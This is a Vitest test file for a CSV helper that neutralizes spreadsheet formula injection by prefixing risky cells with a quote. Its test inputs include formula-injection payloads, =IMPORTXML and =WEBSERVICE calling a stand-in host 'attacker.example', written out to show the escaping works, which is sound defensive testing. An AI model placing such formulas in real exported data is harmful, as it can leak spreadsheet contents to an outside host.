import { describe, expect, it } from "vitest";

import { escapeCsvField } from "../lib/csv-helpers";

describe("csv-helpers", () => {
  it("neutralizes spreadsheet formula prefixes for string cells", () => {
    expect(escapeCsvField("=IMPORTXML(\"https://attacker.example\",\"//x\")")).toBe(
      "\"'=IMPORTXML(\"\"https://attacker.example\"\",\"\"//x\"\")\"",
    );
    expect(escapeCsvField("+SUM(1,1)")).toBe("\"'+SUM(1,1)\"");
    expect(escapeCsvField("-1+2")).toBe("'-1+2");
    expect(escapeCsvField("@SUM(1+1)")).toBe("'@SUM(1+1)");
    expect(escapeCsvField("\t=WEBSERVICE(\"https://attacker.example\")")).toBe(
      "\"'\t=WEBSERVICE(\"\"https://attacker.example\"\")\"",
    );
    expect(escapeCsvField("\r=WEBSERVICE(\"https://attacker.example\")")).toBe(
      "\"'\r=WEBSERVICE(\"\"https://attacker.example\"\")\"",
    );
  });

  it("keeps numeric values numeric while escaping CSV delimiters", () => {
    expect(escapeCsvField(-1)).toBe("-1");
    expect(escapeCsvField("plain,text")).toBe('"plain,text"');
  });
});
